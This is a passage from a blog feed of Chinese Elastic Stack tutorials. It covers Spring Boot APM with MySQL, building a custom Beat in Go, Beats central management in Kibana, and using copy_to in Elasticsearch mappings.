userRepository.findAll();&#125;@GetMapping(path=&quot;/weather&quot;)public @ResponseBody String getBaiduWeather() throws InterruptedException &#123; // Add some random delays before getting the info double delay = Math.random() * 10; System.out.println(&quot;delay: &quot; + delay); TimeUnit.SECONDS.sleep((long)delay); String weather = getWeatherInform(&quot;北京&quot;); return weather;&#125;在获得天气（weather）的接口中，我故意加入了一下随机数的延迟，这样来模拟每一次请求的时间是不同的。我们可以在应用的根目录下打入如下的命令：1./mvnw clean package这样它将会在当前目录下的target子目录下生产一个叫做accessing-data-mysql-0.0.1-SNAPSHOT.jar的文件。12$ ls ./target/accessing-data-mysql-0.0.1-SNAPSHOT.jar./target/accessing-data-mysql-0.0.1-SNAPSHOT.jar我们可以把这个文件拷入到我们想要的任何一个目录中。针对我的情况，我把它拷入到我的home目录下的data/apm目录中。1234$ pwd/Users/liuxg/data/apmliuxg-2:apm liuxg$ ls accessing-data-mysql-0.0.1-SNAPSHOT.jaraccessing-data-mysql-0.0.1-SNAPSHOT.jar安装MySQL我们可以按照文档的需求来安装我们的MySQL。我们在一个terminal中打入如下的命令：1mysql -uroot -p我们打入root用户的密码进入到MySQL之中。为了创建一个数据库，我们在MySQL的prompt中打入如下的命令：123mysql&gt; create database db_example; -- Creates the new databasemysql&gt; create user &apos;springuser&apos;@&apos;%&apos; identified by &apos;ThePassword&apos;; -- Creates the usermysql&gt; grant all on db_example.* to &apos;springuser&apos;@&apos;%&apos;; -- Gives all privileges to the new user on the newly created database上面的命令创建了一个叫做db_example的数据库。同时，它也创建了一个叫做springuser的用户及其密码ThePassword。我们可以通过Navicat工具来查看:运行Elastic Stack安装及运行我们的Elasticsearch及Kibana。我们打开我们的Kibana界面，并点击左上角的部分：然后，我们按照上面的步骤一步一步地进行安装：上面的步骤非常详细。对于APM agent的选择来讲，因为我们是Java应用，所以我们选择Java agent。我们下载相应的agent jar文件，并存放于我们上面放置spring boot的jar文件所处的文件夹。针对我的情况是home目录下的data/apm。1234$ pwd/Users/liuxg/data/apmliuxg-2:apm liuxg$ ls elastic-apm-agent-1.10.0.jar elastic-apm-agent-1.10.0.jar在这个时候，我们可以开始运行我们的Spring Java应用了。我们可以通过如下的命令来运行：123456java -javaagent:./elastic-apm-agent-1.10.0.jar \ -Delastic.apm.service_name=sample_apm \ -Delastic.apm.server_url=http://localhost:8200 \ -Delastic.apm.secret_token= \ -Delastic.apm.application_packages=accessing-data-mysql \ -jar accessing-data-mysql-0.0.1-SNAPSHOT.jar注意：这里的sample_apm是我给取的一个服务名称。你可以根据自己的需求取一个独特的名字。如果你不想这么麻烦，你可以在当前的目录下生产一个叫做elasticapm.properties的文件。它的内容如下：123service_name=sample_apmapplication_packages=accessing-data-mysqlserver_url=http://localhost:8200那么我们可以通过如下的命令来运行：123java -javaagent:./elastic-apm-agent-1.10.0.jar \ -Delastic.apm.secret_token= \ -jar accessing-data-mysql-0.0.1-SNAPSHOT.jar等我们的Spring Boot应用完全起来后，我们点击Kibana中的“Check agent status”按钮。这个时候可能显示没有任何的数据。我们可以打开我们的浏览器，并在浏览器的地址栏中输入如下的地址：我们可以看到我们得到了一下天气的数据信息。那么这个时候我们可以在Agent status中看到信息：启动APM应用如果你已经运行到这里，那么你基本上已经把整个的环境运行起来了。我们可以在terminal中打入如下的命令：1curl localhost:8080/demo/add -d name=First -d email=someemail@someemailprovider.com上面的应用是向我们的数据中写入一条记录。1curl &apos;localhost:8080/demo/all&apos;运行上面的命令可以展示已经输入的所有的记录1curl &apos;localhost:8080/demo/weather&apos;运行上面的命令可以获得百度天气API接口所带给我们的天气信息。上面的所有的信息我们都可以在浏览器中的地址栏中输入。点击Kibana中的APM应用图标：在上面我们可以看到应用的四个接口的统计情况。我们在这个APM应用的dashboard上可以看到我们所有的API的调用情况。比如：因为在我的应用中，我故意加入了一些延迟，所以导致我们的整个getBaiduWeather的请求时间为9.157秒才完成，而api.map.baidu.com的时间只有149ms。到这里我的讲解就完成了。剩下的留给大家自己去挖掘哈！参考：【1】Accessing data with MySQL(https://spring.io/guides/gs/accessing-data-mysql/)]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FBeats%EF%BC%9A%E5%A6%82%E4%BD%95%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E5%AE%9A%E5%88%B6%E7%9A%84Elastic%20Beat%2F</url>
    <content type="text"><![CDATA[Beats作为Elastic Stack家族中重要的部分。它可以和方便地让我们把我们的数据发送到Elasticsearch或Logstash之中。如果我们想要生成自己的Beat，请使用GitHub的beats仓库中提供的Beat生成器。在今天的文章中，我们将详细介绍如何一步一步地来创建一个我们自己想要的beat。设置自己的开发环境安装go环境Beats实际上是go程序。我们可以参照链接“Go get started”(https://golang.org/doc/install)来安装自己的golang语言开发环境。等我们安装好我们的go后，我们可以在terminal中打入如下的命令：12$ which go/usr/local/go/bin/go那么我们需要在我们的环境中设置如下的变量：123export GOROOT=/usr/local/goexport PATH=$GOPATH/bin:$GOROOT/bin:$PATHexport GOPATH=$HOME/go/beats在这里，我也设置了以GOPATH。你可以设置自己的路径。针对我的情况，我在我的home目录下创建了一个go目录，并在go目录下生产一个叫做beats的目录。在一下，我们会在这个目录里生成我们的定制的beat。下载Elastic beats源码在这一步我们下载Elastic beats的源码。在termnial中打入如下的命令：12mkdir -p $&#123;GOPATH&#125;/src/github.com/elasticgit clone https://github.com/elastic/beats $&#123;GOPATH&#125;/src/github.com/elastic/beats安装Python目前generator只对Python2适用，所以，我们需要安装Python2。我们可以参照页面https://www.python.org/downloads/进行安装我们的python2。安装virtualenv我们必须安装virtualenv才能使得generator正常工作。可以参照链接https://virtualenv.pypa.io/en/latest/installation/来进行安装。如果自己的电脑上同时已经安装了python3，那么我们需要同时设置如写变量：12345export PYTHON_EXE=&apos;python2.7&apos;export VIRTUALENV_PARAMS=&apos;-p python2.7&apos;export VIRTUALENV_PYTHON=&apos;/usr/bin/python2.7&apos; export VIRTUALENV_PYTHON=&apos;/usr/local/bin/python&apos; (for Mac)请注意：这里的python是2.x版本的python，而不是python3。我们需要保证VIRTUALENV_PYTHON指向我们的Python2的执行文件。安装mage我们需要在地址https://github.com/magefile/mage下载这个源码，并编译：123go get -u -d github.com/magefile/magecd $GOPATH/src/github.com/magefile/magego run bootstrap.go等上面的命令执行完后，我们可以在如下的目录中找到编译好的执行文件mage:12liuxg-2:bin liuxg$ ls $GOPATH/binmage创建定制beat首先创建一个目录在$GOPATH下，并进入该目录。12mkdir $&#123;GOPATH&#125;/src/github.com/&#123;user&#125;cd $&#123;GOPATH&#125;/src/github.com/&#123;user&#125;注意这里的user指的是自己在github上的用户名。比如针对我的情况是liu-xiao-guo。我打入如下写的命令：12mkdir $&#123;GOPATH&#125;/src/github.com/liu-xiao-guocd $GOPATH/src/github.com/elastic/beats/接下来，我们运行如下的命令：1mage GenerateCustomBeat执行结果：12345678910111213141516171819$ mage GenerateCustomBeat2019/11/13 15:24:01 Found Elastic Beats dir at /Users/liuxg/go/beats/src/github.com/elastic/beatsEnter the beat name [examplebeat]: CountbeatEnter your github name [your-github-name]: liu-xiao-guoEnter the beat path [github.com/liu-xiao-guo/countbeat]: Enter your full name [Firstname Lastname]: Xiaoguo LiuEnter the beat type [beat]: DEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won&apos;t be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-supportDEPRECATION: Python 2.7 will reach the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 won&apos;t be maintained after that date. A future version of pip will drop support for Python 2.7. More details about Python 2 support in pip, can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None)) after connection broken by &apos;ReadTimeoutError(&quot;HTTPSConnectionPool(host=&apos;pypi.tuna.tsinghua.edu.cn&apos;, port=443): Read timed out. (read timeout=15)&quot;,)&apos;: /simple/semver/2019/11/13 15:25:50 Found Elastic Beats dir at /Users/liuxg/go/beats/src/github.com/liu-xiao-guo/countbeat/vendor/github.com/elastic/beatsGenerated fields.yml for countbeat to /Users/liuxg/go/beats/src/github.com/liu-xiao-guo/countbeat/fields.yml2019/11/13 15:25:52 Found Elastic Beats dir at /Users/liuxg/go/beats/src/github.com/liu-xiao-guo/countbeat/vendor/github.com/elastic/beatsAuto packing the repository in background for optimum performance.See &quot;git help gc&quot; for manual housekeeping.=======================Your custom beat is now available as /Users/liuxg/go/beats/src/github.com/liu-xiao-guo/countbeat=======================这样，我们基本上就生产了一个最基本的beat的框架。接下来，我们进入到我们的beat目录里，并进行编译：1cd $&#123;GOPATH&#125;/src/github.com/&#123;user&#125;/countbeat针对我的情况：1cd $&#123;GOPATH&#125;/src/github.com/liu-xiao-guo/countbeat我们可以看一下里面最基本的文件：1234567891011$ pwd/Users/liuxg/go/beats/src/github.com/liu-xiao-guo/countbeatliuxg-2:countbeat liuxg$ lsCONTRIBUTING.md cmd magefile.goLICENSE.txt config main.goMakefile countbeat.docker.yml main_test.goNOTICE.txt countbeat.reference.yml make.batREADME.md countbeat.yml tests_meta docs vendorbeater fields.ymlbuild include这里有最基本的框架文件。里面含有一个叫做countbeat.yml的配置文件及一些标准的模板文件。我们在命令行中直接打入如下的指令：1234make $ make go build -i -ldflags &quot;-X github.com/liu-xiao-guo/countbeat/vendor/github.com/elastic/beats/libbeat/version.buildTime=2019-11-13T07:33:25Z -X github.com/liu-xiao-guo/countbeat/vendor/github.com/elastic/beats/libbeat/version.commit=501bd87da668346f78398676c78b4a39394a3640&quot;经过上面的编译，我们可以发现在当前的目录下，有一个已经编译好的countbeat可执行文件：我们在当前的目录下直接运行这个可执行的文件：1./countbeat -e -d &quot;*&quot;我们可以在terminal中看到：那么在我们的Kibana中也可以看到如下信息：显然数据已经被成功上传到Elasticsearch中了。每一个文档的内容如下：1234567891011121314151617181920212223242526272829&#123; &quot;@timestamp&quot;: &quot;2019-11-13T07:38:57.095Z&quot;, &quot;agent&quot;: &#123; &quot;version&quot;: &quot;8.0.0&quot;, &quot;type&quot;: &quot;countbeat&quot;, &quot;ephemeral_id&quot;: &quot;d3f0638e-ee58-45ff-92cc-74f188fd66a4&quot;, &quot;hostname&quot;: &quot;liuxg-2.local&quot;, &quot;id&quot;: &quot;1d35220e-7f75-442a-88eb-43ec1e97f0d0&quot; &#125;, &quot;counter&quot;: 5, &quot;ecs&quot;: &#123; &quot;version&quot;: &quot;1.2.0&quot; &#125;, &quot;host&quot;: &#123; &quot;hostname&quot;: &quot;liuxg-2.local&quot;, &quot;architecture&quot;: &quot;x86_64&quot;, &quot;os&quot;: &#123; &quot;build&quot;: &quot;19B88&quot;, &quot;platform&quot;: &quot;darwin&quot;, &quot;version&quot;: &quot;10.15.1&quot;, &quot;family&quot;: &quot;darwin&quot;, &quot;name&quot;: &quot;Mac OS X&quot;, &quot;kernel&quot;: &quot;19.0.0&quot; &#125;, &quot;id&quot;: &quot;E51545F1-4BDC-5890-B194-83D23620325A&quot;, &quot;name&quot;: &quot;liuxg-2.local&quot; &#125;, &quot;type&quot;: &quot;liuxg-2.local&quot;&#125;它里面含有一个counter的整数值。所有关于beat的设计上的代码可以在目录${GOPATH}/src/github.com/liu-xiao-guo/countbeat下的/beater/CountBeat.go文件里实现的。设计比较直接。大家可以看一下代码应该可以明白。读取JSON文件beat在上面我们已经熟悉了如何去创建一个template的beat。它是一个最基本的beat，并没有什么特别的功能。在这节里，我们接着如法炮制来创建一个稍微有一点用途的beat。我们的这个beat叫做readjson beat。它的源码可以按照如下的方法得到：1git clone https://github.com/liu-xiao-guo/beats-readjson首先，我们可以准备一个我们想要的json文件，比如：123456789101112131415161718192021222324users.json &#123; &quot;users&quot;: [ &#123; &quot;name&quot;: &quot;Elliot&quot;, &quot;type&quot;: &quot;Reader&quot;, &quot;age&quot;: 23, &quot;social&quot;: &#123; &quot;facebook&quot;: &quot;https://facebook.com&quot;, &quot;twitter&quot;: &quot;https://twitter.com&quot; &#125; &#125;, &#123; &quot;name&quot;: &quot;Fraser&quot;, &quot;type&quot;: &quot;Author&quot;, &quot;age&quot;: 17, &quot;social&quot;: &#123; &quot;facebook&quot;: &quot;https://facebook.com&quot;, &quot;twitter&quot;: &quot;https://twitter.com&quot; &#125; &#125; ] &#125;我们可以把这个文件放入到我们如何喜欢的位置。针对我的情况，我把它置于我的电脑的如下位置：1/Users/liuxg/data/beats/users.json我们可以在readjson.yml文件中进行配置：1readjson.yml我们的readjson.go设计也相当简单：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135readjson.go package beater import ( &quot;fmt&quot; &quot;os&quot; &quot;io/ioutil&quot; &quot;encoding/json&quot; &quot;strconv&quot; &quot;time&quot; &quot;os/signal&quot; &quot;syscall&quot; &quot;github.com/elastic/beats/libbeat/beat&quot; &quot;github.com/elastic/beats/libbeat/common&quot; &quot;github.com/elastic/beats/libbeat/logp&quot; &quot;github.com/liu-xiao-guo/readjson/config&quot; ) type Users struct &#123; Users []User `json:&quot;users&quot;` &#125; // User struct which contains a name // a type and a list of social links type User struct &#123; Name string `json:&quot;name&quot;` Type string `json:&quot;type&quot;` Age int `json:&quot;Age&quot;` Social Social `json:&quot;social&quot;` &#125; // Social struct which contains a // list of links type Social struct &#123; Facebook string `json:&quot;facebook&quot;` Twitter string `json:&quot;twitter&quot;` &#125; // readjson configuration. type readjson struct &#123; done chan struct&#123;&#125; config config.Config client beat.Client &#125; // New creates an instance of readjson. func New(b *beat.Beat, cfg *common.Config) (beat.Beater, error) &#123; c := config.DefaultConfig if err := cfg.Unpack(&amp;c); err != nil &#123; return nil, fmt.Errorf(&quot;Error reading config file: %v&quot;, err) &#125; bt := &amp;readjson&#123; done: make(chan struct&#123;&#125;), config: c, &#125; return bt, nil &#125; // Run starts readjson. func (bt *readjson) Run(b *beat.Beat) error &#123; logp.Info(&quot;readjson is running! Hit CTRL-C to stop it.&quot;) var err error bt.client, err = b.Publisher.Connect() if err != nil &#123; return err &#125; fmt.Println(&quot;Path: &quot;, bt.config.Path) fmt.Println(&quot;Period: &quot;, bt.config.Period) // Open our jsonFile jsonFile, err := os.Open(bt.config.Path) // if we os.Open returns an error then handle it if err != nil &#123; fmt.Println(err) &#125; fmt.Println(&quot;Successfully Opened users.json&quot;) // defer the closing of our jsonFile so that we can parse it later on defer jsonFile.Close() byteValue, _ := ioutil.ReadAll(jsonFile) // we initialize our Users array var users Users json.Unmarshal(byteValue, &amp;users) // we iterate through every user within our users array and // print out the user Type, their name, and their facebook url // as just an example for i := 0; i &lt; len(users.Users); i++ &#123; fmt.Println(&quot;User Type: &quot; + users.Users[i].Type) fmt.Println(&quot;User Age: &quot; + strconv.Itoa(users.Users[i].Age)) fmt.Println(&quot;User Name: &quot; + users.Users[i].Name) fmt.Println(&quot;Facebook Url: &quot; + users.Users[i].Social.Facebook) event := beat.Event&#123; Timestamp: time.Now(), Fields: common.MapStr &#123; &quot;ostype&quot;: b.Info.Name, &quot;name&quot;: users.Users[i].Name, &quot;type&quot;: users.Users[i].Type, &quot;age&quot;: users.Users[i].Age, &quot;social&quot;: users.Users[i].Social, &#125;, &#125; bt.client.Publish(event) &#125; c := make(chan os.Signal) signal.Notify(c, os.Interrupt, syscall.SIGTERM) go func() &#123; &lt;-c os.Exit(1) &#125;() for &#123; fmt.Println(&quot;sleeping...&quot;) time.Sleep(10 * time.Second) &#125; &#125; // Stop stops readjson. func (bt *readjson) Stop() &#123; bt.client.Close() close(bt.done) &#125;它在run method里把json文件读入，并把它们分别发送出去到我们的Elasticsearch中。我们按照上面的步骤进行编译，并最终运行我们的readjson beat。1./readjson -e我们可以在Kibana中看到我们已经发送上来的beat信息：参考：【1】https://www.elastic.co/guide/en/beats/devguide/7.5/newbeat-generate.html]]></content>
  </entry>
  <entry>
    <title></title>
    <url>%2F2020%2F01%2F02%2FBeats%EF%BC%9ABeats%E5%9C%A8Kibana%E4%B8%AD%E7%9A%84%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%2F</url>
    <content type="text"><![CDATA[我们可以通过在命令行中对我们的Beats进行管理，比如我们可以启动metric几个模块，我们可以通过如下的命令来执行：1./metricbeat modules enable apache mysql上面的命令启动apache mysql模块。我们也许觉得这个这样做很方便。但是如果我相对许多的机器（比如几千部机器）来做这样的管理，可能也很麻烦，这是因为我们需要到每一台机器上重复做同样的动作。如果我们需要有改动的话，那么需要对每一台机器再次执行同样的操作。那么有什么办法可以帮助我们减少这个工作量呢？Elastic在Kibana中做进去一个新的功能：集中管理。Beats中央管理使用一种称为配置标签的机制来对相关配置进行分组。 注册第一个Beat后，您可以在Kibana的中央管理UI中定义配置标签。Beats集中管理是6.5版带来的功能。 出于安全考虑，此功能在Elastic Gold许可证或使用我们的Elastic Cloud服务的Standard许可证下可用，以确保正确保护部署。 它包含Kibana中新的Beats中央管理UI，并利用Elasticsearch作为集中式配置存储。 在不久的将来，我们还计划公开一个API，以便更轻松地与外部工具和系统集成。下面我来展示如何使用Beats的集中管理。准备工作就像我上面提到的，我们必须购买Elastic Gold才可以拥有这样的功能。为了测试这个功能，我们可以接受30天尝试，这样我们就可以开始我们的测试了。我们首先点击Kibana中的Management，让后选择30天尝试。当我们接受完条件后，我们可以看到：大家一定可以看到左边的列表会多了一个叫做Beats的种类，并在其下面有一个叫做Central Management的项。我们点击Central Management：它显示我们的安全没有打开，也就是说，这个功能必须配合安全功能才能启用。我们参照我之前的文章“Elasticsearch：设置Elastic账户安全”来启动安全功能。我们使用elastic账号进行登录：我们可以看到一个对话框，提示我们Enroll Beat。点击这个按钮。目前我们看到有两个Beats：Filebeat及Metricbeat可以供我们来选择。我们来选择Metricbeat来做一些实验。同时在Platform中选择自己喜欢的平台：针对我们的情况，我选择MacOS。由于需要使用到Metricbeat，需要安装我们的Metribeat。同时在我们的Terminal中打入从Copy Command处拷贝来的命令：这个时候在我们的Kibana中会显示：在上面显示了我的hostname以及metricbeat的版本信息。我们接下来选择Continue按钮：我们可以选一个我们喜欢的Tag Name和自己喜欢的颜色。在上面我选择了Local表明我的这个Metricbeat是在本地运行的。这样以后我们能很容易地找到我们的这个机器的配置。我们点击Add configuration block按钮：我们可以选择我们的模块，并选择喜欢额module。最后选择Save按钮。再接着选择Save &amp; Continue按钮：最终我们完成了：在上面的画面中选择Done：我们可以看出来我们已经成功地配置好我们的Metricbeat模块了。上面显示Config Status是Offline状态。我们可以在我们的Terminal中打入如下的命令（在Metricbeat的安装目录中）：1./metricbeat run我们再重新刷新我们的Kibana界面：从上面我们可以看出来我们的metricbeat已经在成功运行了。当然我们也可以找到相应的index。按照同样的方法，我们可以对其它的模块来进行配置。我们接下来需要点击我们的Tags来添加或配置我们的Beats:我们可以点击Add configuration block来添加同一个Beat模块里的其它模块，或者增加一个输出到Elasticsearch：针对你的设置你需要修个这个hosts的地址。这样，我们的filebeat的输出就会发送到我们的Elasticsearch中了。我们也可以按照同样的方法来添加另外一个module。参考：【1】https://www.elastic.co/guide/en/beats/filebeat/current/how-central-managment-works.html【2】https://www.elastic.co/blog/introducing-beats-central-management-in-the-elastic-stack]]></content>
  </entry>
  <entry>
    <title><![CDATA[如何使用Elasticsearch中的copy_to来提高搜索效率]]></title>
    <url>%2F2020%2F01%2F02%2F%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Elasticsearch%E4%B8%AD%E7%9A%84copy_to%E6%9D%A5%E6%8F%90%E9%AB%98%E6%90%9C%E7%B4%A2%E6%95%88%E7%8E%87%2F</url>
    <content type="text"><![CDATA[在今天的这个教程中，我们来着重讲解一下如何使用Elasticsearch中的copy来提高搜索的效率。比如在我们的搜索中，经常我们会遇到如下的文档：1234567891011121314&#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125;&#125;在这里，我们可以看到在这个文档中，我们有这样的几个字段：123&quot;city&quot; : &quot;北京&quot;,&quot;province&quot; : &quot;北京&quot;,&quot;country&quot; : &quot;中国&quot;,它们是非常相关的。我们在想是不是可以把它们综合成一个字段，这样可以方便我们的搜索。假如我们要经常对这三个字段进行搜索，那么一种方法我们可以在must子句中使用should子句运行bool查询。这种方法写起来比较麻烦。有没有一种更好的方法呢？我们其实可以使用Elasticsearch所提供的copy_to来提高我们的搜索效率。我们可以首先把我们的index的mapping设置成如下的项（这里假设我们使用的是一个叫做twitter的index)。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859PUT twitter&#123; &quot;mappings&quot;: &#123; &quot;properties&quot;: &#123; &quot;address&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;age&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;city&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;copy_to&quot;: &quot;region&quot; &#125;, &quot;country&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;copy_to&quot;: &quot;region&quot; &#125;, &quot;province&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;copy_to&quot;: &quot;region&quot; &#125;, &quot;region&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;store&quot;: true &#125;, &quot;location&quot;: &#123; &quot;type&quot;: &quot;geo_point&quot; &#125;, &quot;message&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125;, &quot;uid&quot;: &#123; &quot;type&quot;: &quot;long&quot; &#125;, &quot;user&quot;: &#123; &quot;type&quot;: &quot;text&quot;, &quot;fields&quot;: &#123; &quot;keyword&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;ignore_above&quot;: 256 &#125; &#125; &#125; &#125; &#125;&#125;在这里，我们特别注意如下的这个部分：123456789101112131415&quot;city&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;copy_to&quot;: &quot;region&quot;&#125;,&quot;country&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;copy_to&quot;: &quot;region&quot; &#125;,&quot;province&quot;: &#123; &quot;type&quot;: &quot;keyword&quot;, &quot;copy_to&quot;: &quot;region&quot;&#125;,&quot;region&quot;: &#123; &quot;type&quot;: &quot;text&quot;&#125;我们把city, country及province三个项合并成为一个项region，但是这个region并不存在于我们文档的source里。当我们这么定义我们的mapping的话，在文档被索引之后，有一个新的region项可以供我们进行搜索。我们可以采用如下的数据来进行展示：12345678910111213POST _bulk&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 1&#125; &#125;&#123;&quot;user&quot;:&quot;双榆树-张三&quot;,&quot;message&quot;:&quot;今儿天气不错啊，出去转转去&quot;,&quot;uid&quot;:2,&quot;age&quot;:20,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市海淀区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.970718&quot;,&quot;lon&quot;:&quot;116.325747&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 2 &#125;&#125;&#123;&quot;user&quot;:&quot;东城区-老刘&quot;,&quot;message&quot;:&quot;出发，下一站云南！&quot;,&quot;uid&quot;:3,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区台基厂三条3号&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.904313&quot;,&quot;lon&quot;:&quot;116.412754&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 3&#125; &#125;&#123;&quot;user&quot;:&quot;东城区-李四&quot;,&quot;message&quot;:&quot;happy birthday!&quot;,&quot;uid&quot;:4,&quot;age&quot;:30,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市东城区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.893801&quot;,&quot;lon&quot;:&quot;116.408986&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 4&#125; &#125;&#123;&quot;user&quot;:&quot;朝阳区-老贾&quot;,&quot;message&quot;:&quot;123,gogogo&quot;,&quot;uid&quot;:5,&quot;age&quot;:35,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区建国门&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.718256&quot;,&quot;lon&quot;:&quot;116.367910&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 5&#125; &#125;&#123;&quot;user&quot;:&quot;朝阳区-老王&quot;,&quot;message&quot;:&quot;Happy BirthDay My Friend!&quot;,&quot;uid&quot;:6,&quot;age&quot;:50,&quot;city&quot;:&quot;北京&quot;,&quot;province&quot;:&quot;北京&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国北京市朝阳区国贸&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;39.918256&quot;,&quot;lon&quot;:&quot;116.467910&quot;&#125;&#125;&#123; &quot;index&quot; : &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_id&quot;: 6&#125; &#125;&#123;&quot;user&quot;:&quot;虹桥-老吴&quot;,&quot;message&quot;:&quot;好友来了都今天我生日，好友来了,什么 birthday happy 就成!&quot;,&quot;uid&quot;:7,&quot;age&quot;:90,&quot;city&quot;:&quot;上海&quot;,&quot;province&quot;:&quot;上海&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;address&quot;:&quot;中国上海市闵行区&quot;,&quot;location&quot;:&#123;&quot;lat&quot;:&quot;31.175927&quot;,&quot;lon&quot;:&quot;121.383328&quot;&#125;&#125;在Kibnana中执行上面的语句，它将为我们生产我们的twitter索引。同时我们可以通过如下的语句来查询我们的mapping:我们可以看到twitter的mapping中有一个新的被称作为region的项。它将为我们的搜索带来方便。那么假如我们想搜索country:中国，province:北京 这样的记录的话，我们可以只写如下的一条语句就可以了：1234567891011GET twitter/_search &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;region&quot;: &#123; &quot;query&quot;: &quot;中国 北京&quot;, &quot;minimum_should_match&quot;: 4 &#125; &#125; &#125;&#125;下面显示的是搜索的结果：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119&#123; &quot;took&quot; : 0, &quot;timed_out&quot; : false, &quot;_shards&quot; : &#123; &quot;total&quot; : 1, &quot;successful&quot; : 1, &quot;skipped&quot; : 0, &quot;failed&quot; : 0 &#125;, &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 5, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : 0.8114117, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;1&quot;, &quot;_score&quot; : 0.8114117, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;双榆树-张三&quot;, &quot;message&quot; : &quot;今儿天气不错啊，出去转转去&quot;, &quot;uid&quot; : 2, &quot;age&quot; : 20, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市海淀区&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.970718&quot;, &quot;lon&quot; : &quot;116.325747&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2&quot;, &quot;_score&quot; : 0.8114117, &quot;_source&quot; : &#123; &quot;user&quot; : &quot;东城区-老刘&quot;, &quot;message&quot; : &quot;出发，下一站云南！&quot;, &quot;uid&quot; : 3, &quot;age&quot; : 30, &quot;city&quot; : &quot;北京&quot;, &quot;province&quot; : &quot;北京&quot;, &quot;country&quot; : &quot;中国&quot;, &quot;address&quot; : &quot;中国北京市东城区台基厂三条3号&quot;, &quot;location&quot; : &#123; &quot;lat&quot; : &quot;39.904313&quot;, &quot;lon&quot; : &quot;116.412754&quot; &#125; &#125; &#125;, &#123; &quot;_index&quot; : &quot;twitter&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;3&quot;, &quot;_score&quot; : 0.8114117, &quot;_source&quot; : &#123; 